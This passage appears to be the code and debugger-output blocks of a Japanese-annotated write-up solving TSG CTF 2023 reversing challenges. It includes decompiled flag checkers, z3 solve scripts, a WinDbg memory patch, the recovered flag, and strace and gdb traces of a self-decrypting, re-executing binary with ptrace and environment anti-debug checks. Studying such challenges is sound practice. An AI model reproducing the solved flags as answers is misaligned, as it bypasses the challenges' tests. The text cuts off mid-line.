00000008 dwArraySboxSize256 dd 256 dup(?)
00000408 EncryptionContext ends
int __fastcall main(int argc, const char **argv, const char **envp)
{
 EncryptionContext *pContext; // rdi
 __int64 dwKeyLength; // rdx
 BYTE *pByteArrayFromInputtedFlag; // rbx
 __int64 dwBlockSize; // rsi
 BYTE *pCharToModifyInputtedFlag; // rdx
 __int64 dwRestRoundCount; // r8
 unsigned __int64 v9; // rax
 BYTE *v10; // rax
 unsigned __int64 v11; // rcx
 int bIsWrong; // eax
 const char *pStrOutput; // rcx
 char strSomeKey[16]; // [rsp+20h] [rbp-238h] BYREF
 BYTE byteArrayEncryptedFlagSize0x210[528]; // [rsp+30h] [rbp-228h] BYREF

 pContext = (EncryptionContext *)malloc(sizeof(EncryptionContext));
 dwKeyLength = -1i64;
 pContext->dwSomething0 = 0;
 pContext->dwSomething4 = 0;
 strcpy(strSomeKey, "2023TTSSGG2023!"); // 末尾NUL文字含めて16バイト
 do
 ++dwKeyLength;
 while ( strSomeKey[dwKeyLength] ); // 試しても実際長さは15
 InitializeSbox((BYTE *)pContext, dwKeyLength, strSomeKey);
 pByteArrayFromInputtedFlag = (BYTE *)malloc(0x201ui64);
 memset(pByteArrayFromInputtedFlag, 0, 0x201ui64);
 printf("Flag> ");
 scanf("%s", pByteArrayFromInputtedFlag);
 memset(byteArrayEncryptedFlagSize0x210, 0, 0x201ui64);
 dwBlockSize = 2i64; // 1ブロック256バイトらしい
 pCharToModifyInputtedFlag = pByteArrayFromInputtedFlag + 24;
 dwRestRoundCount = 2i64;
 do
 {
 *((_QWORD *)pCharToModifyInputtedFlag - 3) ^= *((_QWORD *)pCharToModifyInputtedFlag - 3) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag - 2) ^= *((_QWORD *)pCharToModifyInputtedFlag - 2) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag - 1) ^= *((_QWORD *)pCharToModifyInputtedFlag - 1) >> 12;
 *(_QWORD *)pCharToModifyInputtedFlag ^= *(_QWORD *)pCharToModifyInputtedFlag >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag + 1) ^= *((_QWORD *)pCharToModifyInputtedFlag + 1) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag + 2) ^= *((_QWORD *)pCharToModifyInputtedFlag + 2) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag + 3) ^= *((_QWORD *)pCharToModifyInputtedFlag + 3) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag + 4) ^= *((_QWORD *)pCharToModifyInputtedFlag + 4) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag + 5) ^= *((_QWORD *)pCharToModifyInputtedFlag + 5) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag + 6) ^= *((_QWORD *)pCharToModifyInputtedFlag + 6) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag + 7) ^= *((_QWORD *)pCharToModifyInputtedFlag + 7) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag + 8) ^= *((_QWORD *)pCharToModifyInputtedFlag + 8) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag + 9) ^= *((_QWORD *)pCharToModifyInputtedFlag + 9) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag + 10) ^= *((_QWORD *)pCharToModifyInputtedFlag + 10) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag + 11) ^= *((_QWORD *)pCharToModifyInputtedFlag + 11) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag + 12) ^= *((_QWORD *)pCharToModifyInputtedFlag + 12) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag + 13) ^= *((_QWORD *)pCharToModifyInputtedFlag + 13) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag + 14) ^= *((_QWORD *)pCharToModifyInputtedFlag + 14) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag + 15) ^= *((_QWORD *)pCharToModifyInputtedFlag + 15) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag + 16) ^= *((_QWORD *)pCharToModifyInputtedFlag + 16) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag + 17) ^= *((_QWORD *)pCharToModifyInputtedFlag + 17) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag + 18) ^= *((_QWORD *)pCharToModifyInputtedFlag + 18) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag + 19) ^= *((_QWORD *)pCharToModifyInputtedFlag + 19) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag + 20) ^= *((_QWORD *)pCharToModifyInputtedFlag + 20) >> 12;
 v9 = *((_QWORD *)pCharToModifyInputtedFlag + 21);
 pCharToModifyInputtedFlag += 256;
 *((_QWORD *)pCharToModifyInputtedFlag - 11) = v9 ^ (v9 >> 12);
 *((_QWORD *)pCharToModifyInputtedFlag - 10) ^= *((_QWORD *)pCharToModifyInputtedFlag - 10) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag - 9) ^= *((_QWORD *)pCharToModifyInputtedFlag - 9) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag - 8) ^= *((_QWORD *)pCharToModifyInputtedFlag - 8) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag - 7) ^= *((_QWORD *)pCharToModifyInputtedFlag - 7) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag - 6) ^= *((_QWORD *)pCharToModifyInputtedFlag - 6) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag - 5) ^= *((_QWORD *)pCharToModifyInputtedFlag - 5) >> 12;
 *((_QWORD *)pCharToModifyInputtedFlag - 4) ^= *((_QWORD *)pCharToModifyInputtedFlag - 4) >> 12;
 --dwRestRoundCount;
 }
 while ( dwRestRoundCount );
 Encrypt(
 pContext, // 関数中で書き換えられる
 (__int64)pCharToModifyInputtedFlag, // 未使用引数
 pByteArrayFromInputtedFlag,
 byteArrayEncryptedFlagSize0x210);
 v10 = &byteArrayEncryptedFlagSize0x210[24];
 do
 {
 *((_QWORD *)v10 - 3) ^= *((_QWORD *)v10 - 3) >> 12;
 *((_QWORD *)v10 - 2) ^= *((_QWORD *)v10 - 2) >> 12;
 *((_QWORD *)v10 - 1) ^= *((_QWORD *)v10 - 1) >> 12;
 *(_QWORD *)v10 ^= *(_QWORD *)v10 >> 12;
 *((_QWORD *)v10 + 1) ^= *((_QWORD *)v10 + 1) >> 12;
 *((_QWORD *)v10 + 2) ^= *((_QWORD *)v10 + 2) >> 12;
 *((_QWORD *)v10 + 3) ^= *((_QWORD *)v10 + 3) >> 12;
 *((_QWORD *)v10 + 4) ^= *((_QWORD *)v10 + 4) >> 12;
 *((_QWORD *)v10 + 5) ^= *((_QWORD *)v10 + 5) >> 12;
 *((_QWORD *)v10 + 6) ^= *((_QWORD *)v10 + 6) >> 12;
 *((_QWORD *)v10 + 7) ^= *((_QWORD *)v10 + 7) >> 12;
 *((_QWORD *)v10 + 8) ^= *((_QWORD *)v10 + 8) >> 12;
 *((_QWORD *)v10 + 9) ^= *((_QWORD *)v10 + 9) >> 12;
 *((_QWORD *)v10 + 10) ^= *((_QWORD *)v10 + 10) >> 12;
 *((_QWORD *)v10 + 11) ^= *((_QWORD *)v10 + 11) >> 12;
 *((_QWORD *)v10 + 12) ^= *((_QWORD *)v10 + 12) >> 12;
 *((_QWORD *)v10 + 13) ^= *((_QWORD *)v10 + 13) >> 12;
 *((_QWORD *)v10 + 14) ^= *((_QWORD *)v10 + 14) >> 12;
 *((_QWORD *)v10 + 15) ^= *((_QWORD *)v10 + 15) >> 12;
 *((_QWORD *)v10 + 16) ^= *((_QWORD *)v10 + 16) >> 12;
 *((_QWORD *)v10 + 17) ^= *((_QWORD *)v10 + 17) >> 12;
 *((_QWORD *)v10 + 18) ^= *((_QWORD *)v10 + 18) >> 12;
 *((_QWORD *)v10 + 19) ^= *((_QWORD *)v10 + 19) >> 12;
 *((_QWORD *)v10 + 20) ^= *((_QWORD *)v10 + 20) >> 12;
 v11 = *((_QWORD *)v10 + 21);
 v10 += 256;
 *((_QWORD *)v10 - 11) = v11 ^ (v11 >> 12);
 *((_QWORD *)v10 - 10) ^= *((_QWORD *)v10 - 10) >> 12;
 *((_QWORD *)v10 - 9) ^= *((_QWORD *)v10 - 9) >> 12;
 *((_QWORD *)v10 - 8) ^= *((_QWORD *)v10 - 8) >> 12;
 *((_QWORD *)v10 - 7) ^= *((_QWORD *)v10 - 7) >> 12;
 *((_QWORD *)v10 - 6) ^= *((_QWORD *)v10 - 6) >> 12;
 *((_QWORD *)v10 - 5) ^= *((_QWORD *)v10 - 5) >> 12;
 *((_QWORD *)v10 - 4) ^= *((_QWORD *)v10 - 4) >> 12;
 --dwBlockSize;
 }
 while ( dwBlockSize ); // 2回ループ
 bIsWrong = memcmp(byteArrayEncryptedFlagSize0x210, g_byteArrayExptededResult, 0x200ui64);
 pStrOutput = "Correct!!!";
 if ( bIsWrong )
 pStrOutput = "Wrong...";
 puts(pStrOutput);
 return 0;
}
#!/usr/bin/env python3

import struct
import z3

# `x ^ (x >> 12)`の逆関数です。
def inv_xor_shr12(x):
 s = z3.Solver()
 v = z3.BitVec("v", 64)
 s.add(v ^ (z3.LShR(v, 12)) == x)
 if s.check() == z3.sat:
 return s.model()[v].as_long()
 raise Exception("Can not satisfied")

def inv_xor_shr12_bytearray(b):
 for i in range(len(b) // 8):
 v = struct.unpack("<Q", b[i*8:(i+1)*8])[0]
 # print(f"{i=}, {v=:
16x}")
 original = inv_xor_shr12(v)
 b[i*8:(i+1)*8] = struct.pack("<Q", original)

# IDAで「.data:
0000000140004040」以降をしばらく範囲選択して、Shift+Eで「Export data」して取得しました
expected = bytearray.fromhex("07 56 E5 58 71 89 9A CA F0 67 03 2D 49 FB 6E 86 C2 F7 48 CA 3C 43 DB 8E 04 2A 56 4A 97 33 A1 A2 07 83 F0 89 19 13 77 B4 9F 7D 7B 9C DD 8E FD AD B5 E2 28 0E 06 AF E5 E3 86 C3 08 AD E6 4C DE 63 A3 5F 1E 96 34 7D 9D 19 F5 C8 84 7F 7B 62 2A 6B C1 28 3B 6D 09 EF FC CB A0 90 9A 3E 66 A2 4E 06 90 2C 9D AE 3C 99 40 53 4C 69 63 E7 B9 A8 B3 87 A5 97 98 FE 1F 20 51 A7 AE 0D 00 AB 16 35 59 3D 08 1B 1C 92 E2 4F 1D 86 A5 6E 0A 14 45 4D 61 08 69 C3 12 A2 EB 50 13 93 22 E2 C4 10 CA 5F B2 0B A2 30 C8 54 91 3A 37 FD D2 10 AB 5A F8 38 F3 D3 D5 85 58 DE DF C0 F4 17 4E F7 31 79 DD 41 2F B3 20 C7 EC 98 5E AE F7 A9 CB 27 13 72 FE CA 64 FF 43 93 80 3E 1E E5 99 BF 41 4B 9D 85 4E 0F 99 94 57 E1 63 D9 01 85 78 8A 06 FE 9D 41 32 74 55 83 B2 85 E9 9F C6 2C 4B 62 8F BF 7D 57 C8 76 3B 31 5E 87 60 89 35 41 C1 52 6C D0 0B 7D CA 60 5D 82 19 B0 96 5E 16 E7 9B 2F 37 5F C9 C5 F3 20 C3 45 CB 47 A1 CC 79 E5 B6 FB D4 55 DB C1 35 9B 8B FA 38 D5 B2 B5 E0 4F 4D 6C 4F 8C 0C 42 BC 8E B3 78 48 E4 87 8E 34 A3 1D 01 53 98 71 FA 8F 2F E3 7A 6B B9 1B B6 7E 34 7F C8 C4 6C AB 45 4D 81 EF EE C3 D9 DB 13 5B 63 90 FC 34 18 81 BC D1 18 48 BB 7C 24 5B 56 2B 35 6B D7 F9 D3 D5 2B E2 24 D8 50 F1 EC D5 E6 29 55 66 F2 F7 28 20 7D F3 47 40 03 11 4A 47 A5 B4 74 15 35 D0 F0 E5 4C 04 B5 59 FE FC 45 9D 3A A1 3F 1A A7 A8 51 E5 65 F1 56 EE DE FC C4 87 F5 FA 79 31 07 0A 3F 41 28 D1 59 17 4D 02 E4 5A 22 3A BC D2 CD 80 BC 2A 49 F0 7F 97 A1 90 59 01 8D 25 43 D8 00 EA D8 4F E2 4E 2B 06 FD 7E 16 A9 92 C4 FD B5 6A 82 06 18 0C 0A B7 B8 29 8F 87 63 65 25 B9 7A D0 6E 30 3C F2 F7 C2 30 86")

inv_xor_shr12_bytearray(expected)
print("restored bitshift+xor: ", end="")
print(' '.join(map(lambda b:f"{b:
02x}", expected)))
$ ./solve1.py
restored bitshift+xor: 0b cb d0 59 13 20 96 ca 39 97 0c ff 20 9d 66 86 67 55 2a 2a 06 ae d3 8e be a9 3b d8 26 19 ab a2 cb c0 3c c4 dc 54 7c b4 ae 12 f3 86 a8 51 f7 ad 2e bf d9 15 bf 91 eb e3 b1 72 13 bb 61 71 d8 63 9f c4 b3 d9 fa e4 9c 19 cd 86 e3 74 b6 d0 2c 6b 1e f7 fd 6d 0c 50 f0 cb 5f f3 3f 56 8a c6 4e 06 3a a3 fa 78 66 ad 45 53 ad 1b 2e d7 04 d3 bb 87 88 d4 32 a4 aa 55 5b a7 0e 05 8a a0 b8 e0 5a 3d b0 8a 1b 79 b0 2e 15 86 a2 77 90 a1 59 cb 61 08 f3 af c9 b6 4d 61 1a 93 32 0a 81 5e e4 e4 b2 0b e4 63 34 c5 1f e9 38 fd 48 a2 29 2b 18 07 fe d3 7b e4 1a 26 84 bf f5 17 11 fe 95 40 9a 73 24 b3 6c c4 34 80 8d 31 fd a9 4f 4b c8 b6 4d 3c 6b ff b7 44 7f fd 3f 1c 92 bf 74 58 33 e1 4a 46 90 94 90 74 5c f9 03 22 70 8a 86 01 f8 5f e6 41 5d 83 34 6d 88 1e 16 08 4d 62 57 86 9d 03 4e 65 38 31 08 62 55 5e 73 6d c4 52 f5 9e e9 24 9e 45 55 82 c4 de ed b6 87 1e 99 2f af 87 89 0d 84 7c c7 45 fd 61 63 22 ec 5e b9 fb 97 3e b4 f6 76 33 84 fa 15 d6 32 00 58 8b 4b 6c 9a 50 cd 1d fc 05 b4 78 96 e3 7d a0 ef b2 1d 01 ac f8 0f e6 c7 81 e4 7a 52 9d 43 82 45 b3 73 c8 c2 6d 10 b0 5b 6f e1 ee c7 45 c0 b9 a1 aa 9f fc 57 3b 36 72 eb ac 43 bb ac 0e ad 62 4f 43 66 d7 1c 5e de b8 30 29 dd 50 72 3f 38 dd be 73 69 f2 b7 0e 64 42 f4 73 40 03 9d c8 28 f8 d6 25 16 35 c5 5f f1 4a 61 50 56 fe f8 49 c0 d0 a5 4e 10 a7 14 c5 4b e9 ca b8 e3 de db 76 22 5b ea 0a 31 07 bf 52 db a6 e9 88 13 4d 93 1d 99 3f dc 61 de cd 00 08 48 2b 26 66 9d a1 e2 28 17 67 a1 4e d8 00 48 2d 5a 5f d1 fb 09 fd 12 cd b6 fd f1 56 b3 6a c4 6f 94 c6 a8 2c ba 29 37 8f 8b 80 5e be 77 d0 48 6e e2 e5 7d a1 38 86
$
0:
000> bu 0x0000000140001B59
0:
000> g
Breakpoint 0 hit
beginners_rev_2023_Removed_DllCanMove+0x1b59:
00000001`40001b59 e882f5ffff call beginners_rev_2023_Removed_DllCanMove+0x10e0 (00000001`400010e0)
0:
000> db @r8
00000000`005ebe40 42 22 74 74 00 00 00 00-00 00 00 00 00 00 00 00 B"tt............
00000000`005ebe50 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000000`005ebe60 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000000`005ebe70 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000000`005ebe80 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000000`005ebe90 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000000`005ebea0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000000`005ebeb0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0:
000> eb @r8 0b cb d0 59 13 20 96 ca 39 97 0c ff 20 9d 66 86 67 55 2a 2a 06 ae d3 8e be a9 3b d8 26 19 ab a2 cb c0 3c c4 dc 54 7c b4 ae 12 f3 86 a8 51 f7 ad 2e bf d9 15 bf 91 eb e3 b1 72 13 bb 61 71 d8 63 9f c4 b3 d9 fa e4 9c 19 cd 86 e3 74 b6 d0 2c 6b 1e f7 fd 6d 0c 50 f0 cb 5f f3 3f 56 8a c6 4e 06 3a a3 fa 78 66 ad 45 53 ad 1b 2e d7 04 d3 bb 87 88 d4 32 a4 aa 55 5b a7 0e 05 8a a0 b8 e0 5a 3d b0 8a 1b 79 b0 2e 15 86 a2 77 90 a1 59 cb 61 08 f3 af c9 b6 4d 61 1a 93 32 0a 81 5e e4 e4 b2 0b e4 63 34 c5 1f e9 38 fd 48 a2 29 2b 18 07 fe d3 7b e4 1a 26 84 bf f5 17 11 fe 95 40 9a 73 24 b3 6c c4 34 80 8d 31 fd a9 4f 4b c8 b6 4d 3c 6b ff b7 44 7f fd 3f 1c 92 bf 74 58 33 e1 4a 46 90 94 90 74 5c f9 03 22 70 8a 86 01 f8 5f e6 41 5d 83 34 6d 88 1e 16 08 4d 62 57 86 9d 03 4e 65 38 31 08 62 55 5e 73 6d c4 52 f5 9e e9 24 9e 45 55 82 c4 de ed b6 87 1e 99 2f af 87 89 0d 84 7c c7 45 fd 61 63 22 ec 5e b9 fb 97 3e b4 f6 76 33 84 fa 15 d6 32 00 58 8b 4b 6c 9a 50 cd 1d fc 05 b4 78 96 e3 7d a0 ef b2 1d 01 ac f8 0f e6 c7 81 e4 7a 52 9d 43 82 45 b3 73 c8 c2 6d 10 b0 5b 6f e1 ee c7 45 c0 b9 a1 aa 9f fc 57 3b 36 72 eb ac 43 bb ac 0e ad 62 4f 43 66 d7 1c 5e de b8 30 29 dd 50 72 3f 38 dd be 73 69 f2 b7 0e 64 42 f4 73 40 03 9d c8 28 f8 d6 25 16 35 c5 5f f1 4a 61 50 56 fe f8 49 c0 d0 a5 4e 10 a7 14 c5 4b e9 ca b8 e3 de db 76 22 5b ea 0a 31 07 bf 52 db a6 e9 88 13 4d 93 1d 99 3f dc 61 de cd 00 08 48 2b 26 66 9d a1 e2 28 17 67 a1 4e d8 00 48 2d 5a 5f d1 fb 09 fd 12 cd b6 fd f1 56 b3 6a c4 6f 94 c6 a8 2c ba 29 37 8f 8b 80 5e be 77 d0 48 6e e2 e5 7d a1 38 86
0:
000> r @r9
r9=000000000014fcc0
0:
000> p
beginners_rev_2023_Removed_DllCanMove+0x1b5e:
00000001`40001b5e 488d442448 lea rax,[rsp+48h]
0:
000> db 0x000000000014fcc0
00000000`0014fcc0 21 67 03 26 e0 d1 7c 79-c7 00 58 24 f7 33 6a 64 !g.&..|y..X$.3jd
00000000`0014fcd0 b8 33 58 47 64 01 36 37-27 98 e1 59 1b c7 72 5f .3XGd.67'..Y..r_
00000000`0014fce0 c4 75 69 57 15 f4 75 79-83 22 79 56 34 90 31 5f .uiW..uy."yV4.1_
00000000`0014fcf0 27 98 e1 59 1b c7 72 5f-c4 75 69 57 15 f4 75 79 '..Y..r_.uiW..uy
00000000`0014fd00 83 42 dc 01 9b f6 59 6c-85 57 28 c5 31 4c 33 61 .B....Yl.W(.1L3a
00000000`0014fd10 95 f6 49 8f 87 78 68 31-98 62 58 63 d3 47 6d 37 ..I..xh1.bXc.Gm7
00000000`0014fd20 e4 75 7d 00 00 00 00 00-00 00 00 00 00 00 00 00 .u}.............
00000000`0014fd30 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
#!/usr/bin/env python3

import struct
import z3

# `x ^ (x >> 12)`の逆関数です。
def inv_xor_shr12(x):
 s = z3.Solver()
 v = z3.BitVec("v", 64)
 s.add(v ^ (z3.LShR(v, 12)) == x)
 if s.check() == z3.sat:
 return s.model()[v].as_long()
 raise Exception("Can not satisfied")

def inv_xor_shr12_bytearray(b):
 for i in range(len(b) // 8):
 v = struct.unpack("<Q", b[i*8:(i+1)*8])[0]
 # print(f"{i=}, {v=:
16x}")
 original = inv_xor_shr12(v)
 b[i*8:(i+1)*8] = struct.pack("<Q", original)

# WinDbgで確認したやつ
modified_flag = bytearray.fromhex("""
21 67 03 26 e0 d1 7c 79 c7 00 58 24 f7 33 6a 64
b8 33 58 47 64 01 36 37 27 98 e1 59 1b c7 72 5f
c4 75 69 57 15 f4 75 79 83 22 79 56 34 90 31 5f
27 98 e1 59 1b c7 72 5f c4 75 69 57 15 f4 75 79
83 42 dc 01 9b f6 59 6c 85 57 28 c5 31 4c 33 61
95 f6 49 8f 87 78 68 31 98 62 58 63 d3 47 6d 37
e4 75 7d 00 00 00 00 00 00 00 00 00 00 00 00 00
""" )
# print(modified_flag.hex())
inv_xor_shr12_bytearray(modified_flag)
print(modified_flag.rstrip(b"\x00").decode())
$ ./solve2.py
TSGCTF{y0u_w0uld_und3r57and_h0w_70_d3cryp7_arc4_and_h0w_70_d3cryp7_7h3_l3ak3d_5af3_l1nk1ng_p01n73r}
$
T「グアアアア」 S「Tがやられたようだな…」 G「フフフ…奴は百天王の中でも最弱…」 C「人間ごときに負けるとはTSGerの面汚しよ…」
$ file *
t_the_weakest: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), BuildID[sha1]=4890da9fdfbb0b21eb3cfb1a9974eb32558f4e51, for GNU/Linux 3.2.0, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, no section header
$
LOAD:
00000000000010A0 ; int __fastcall main(int, char **, char **)
LOAD:
00000000000010A0 main proc near
LOAD:
00000000000010A0
LOAD:
00000000000010A0 s= byte ptr -12C08Bh
LOAD:
00000000000010A0 bufSize1228883= byte ptr -12C06Bh
LOAD:
00000000000010A0 var_18= byte ptr -18h
LOAD:
00000000000010A0
LOAD:
00000000000010A0 push r12
LOAD:
00000000000010A2 push rbp
LOAD:
00000000000010A3 push rbx
LOAD:
00000000000010A4 sub rsp, 12C080h
$ strace ./t_the_weakest 'TSGCTF{DUMMY}' 2>&1 | grep -e '^read' -e 'write' -e 'execve'
execve("./t_the_weakest", ["./t_the_weakest", "TSGCTF{DUMMY}"], 0x7ffdce594b98 /* 24 vars */) = 0
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\237\2\0\0\0\0\0"..., 832) = 832
write(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\240\21\0\0\0\0\0\0"..., 1228883) = 1228883
execve("/proc/self/fd/3", ["./t_the_weakest", "SGCTF{DUMMY}"], 0x7ffe41aa9e00 /* 24 vars */) = 0
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\237\2\0\0\0\0\0"..., 832) = 832
write(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0p\21\0\0\0\0\0\0"..., 1216595) = 1216595
execve("/proc/self/fd/3", ["./t_the_weakest", "GCTF{DUMMY}"], 0x7ffd4a881b90 /* 24 vars */) = 0
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\237\2\0\0\0\0\0"..., 832) = 832
write(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\21\0\0\0\0\0\0"..., 1204307) = 1204307
execve("/proc/self/fd/3", ["./t_the_weakest", "CTF{DUMMY}"], 0x7fffb5931020 /* 24 vars */) = 0
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\237\2\0\0\0\0\0"..., 832) = 832
write(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\240\21\0\0\0\0\0\0"..., 1192019) = 1192019
execve("/proc/self/fd/3", ["./t_the_weakest", "TF{DUMMY}"], 0x7ffe46acd6a0 /* 24 vars */) = 0
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\237\2\0\0\0\0\0"..., 832) = 832
write(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\21\0\0\0\0\0\0"..., 1179731) = 1179731
execve("/proc/self/fd/3", ["./t_the_weakest", "F{DUMMY}"], 0x7ffdad571b90 /* 24 vars */) = 0
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\237\2\0\0\0\0\0"..., 832) = 832
write(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\21\0\0\0\0\0\0"..., 1167443) = 1167443
execve("/proc/self/fd/3", ["./t_the_weakest", "{DUMMY}"], 0x7ffea5bb9500 /* 24 vars */) = 0
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\237\2\0\0\0\0\0"..., 832) = 832
write(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0p\21\0\0\0\0\0\0"..., 1155155) = 1155155
execve("/proc/self/fd/3", ["./t_the_weakest", "DUMMY}"], 0x7fff19edcf00 /* 24 vars */) = 0
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\237\2\0\0\0\0\0"..., 832) = 832
write(1, "ng\n", 3ng
$
$ gdb -q ./t_the_weakest [/mnt/d/Documents/work/ctf/TSG_CTF_2023/t_the_weakest]
Reading symbols from ./t_the_weakest...
(No debugging symbols found in ./t_the_weakest)
gdb-peda$ starti
Starting program: /mnt/d/Documents/work/ctf/TSG_CTF_2023/t_the_weakest/t_the_weakest

Program stopped.
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.
[----------------------------------registers-----------------------------------]
(色々表示省略)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00007ffff7fe3290 in _start () from /lib64/ld-linux-x86-64.so.2
gdb-peda$ b write
Function "write" not defined.
gdb-peda$
$ gdb -q -n ./t_the_weakest
Reading symbols from ./t_the_weakest...
(No debugging symbols found in ./t_the_weakest)
(gdb) starti
Starting program: /mnt/d/Documents/work/ctf/TSG_CTF_2023/t_the_weakest/t_the_weakest

Program stopped.
0x00007ffff7fe3290 in _start () from /lib64/ld-linux-x86-64.so.2
(gdb) b write
Function "write" not defined.
Make breakpoint pending on future shared library load? (y or [n]) y
Breakpoint 1 (write) pending.
(gdb)
__int64 __fastcall main(int a1, char **a2, char **a3)
{
 __int64 v3; // rbx
 char *v4; // rcx
 unsigned int v5; // ebx
 char s[32]; // [rsp+Dh] [rbp-EA08Bh] BYREF
 char buf[958547]; // [rsp+2Dh] [rbp-EA06Bh] BYREF
 char v9; // [rsp+EA080h] [rbp-18h] BYREF

 v3 = *a2[1];
 qmemcpy(buf, &unk_2026, (unsigned __int64)&unk_EA053);
 if ( ((32 * (v3 ^ (v3 << 13) ^ ((v3 ^ (unsigned __int64)(v3 << 13)) >> 17))) ^ v3 ^ (v3 << 13) ^ ((v3 ^ (unsigned __int64)(v3 << 13)) >> 17)) != 28691816
 || getenv("LINES")
 || getenv("COLUMNS") )
 {
 PrintNgAndExit();
 }
 v4 = buf;
 do
 {
 *v4++ ^= (272475379 * v3 + 313924224) % 1000000403;
 v3 = (272475379 * v3 + 313924224) % 1000000403;
 }
 while ( &v9 != v4 );
 v5 = syscall(319LL, "", 3LL);
 write(v5, buf, (size_t)&unk_EA053);
 sprintf(s, "/proc/self/fd/%d", v5);
 ++a2[1];
 execv(s, a2);
 return 0LL;
}
__int64 __fastcall main(int a1, char **a2, char **a3)
{
 __int64 v3; // rdx
 char *v4; // rcx
 unsigned int v5; // ebx
 char s[32]; // [rsp+5h] [rbp-DE093h] BYREF
 char buf[909403]; // [rsp+25h] [rbp-DE073h] BYREF
 char v9; // [rsp+DE080h] [rbp-18h] BYREF

 if ( (_BYTE *)malloc(0x10uLL) - (_BYTE *)&unk_E2061 <= (__int64)&unk_20000
 || (v3 = *a2[1],
 qmemcpy(buf, &unk_2018, (unsigned __int64)&unk_DE05B),
 ((32 * (v3 ^ (v3 << 13) ^ ((v3 ^ (unsigned __int64)(v3 << 13)) >> 17))) ^ v3 ^ (v3 << 13) ^ ((v3 ^ (unsigned __int64)(v3 << 13)) >> 17)) != 27036706) )
 {
 PrintNgAndExit();
 }
 v4 = buf;
 do
 {
 v3 = (515278356 * v3 + 409101434) % 1000000021;
 *v4++ ^= v3;
 }
 while ( &v9 != v4 );
 v5 = syscall(319LL, "", 3LL);
 write(v5, buf, (size_t)&unk_DE05B);
 sprintf(s, "/proc/self/fd/%d", v5);
 ++a2[1];
 execv(s, a2);
 return 0LL;
}
0x5555555550c3: call 0x555555555060
=> 0x5555555550c8: lea rdx,[rip+0xe0f92] # 0x555555636061
 0x5555555550cf: sub rax,rdx
 0x5555555550d2: cmp rax,0x20000
 0x5555555550d8: jg 0x5555555550e1
__int64 __fastcall main(int a1, char **a2, char **a3)
{
 char v3; // al
 __int64 v4; // rdx
 char *v5; // rcx
 unsigned int ppid; // ebp
 unsigned int v7; // ebp
 char s[32]; // [rsp+Dh] [rbp-7B0BBh] BYREF
 char buf[503939]; // [rsp+2Dh] [rbp-7B09Bh] BYREF
 char v11; // [rsp+7B0B0h] [rbp-18h] BYREF

 v3 = *a2[1];
 qmemcpy(buf, &unk_2018, (unsigned __int64)&unk_7B083);
 if ( v3 != 'h' )
 goto locPrintNgAndExit;
 v4 = 104LL;
 v5 = buf;
 do
 {
 v4 = (720938020 * v4 + 82437315) % 1000000403;
 *v5++ ^= v4;
 }
 while ( v5 != &v11 );
 ppid = getppid();
 if ( ptrace(PTRACE_GETFPREGS|0x140, 0LL, 0LL, 0LL) != -1
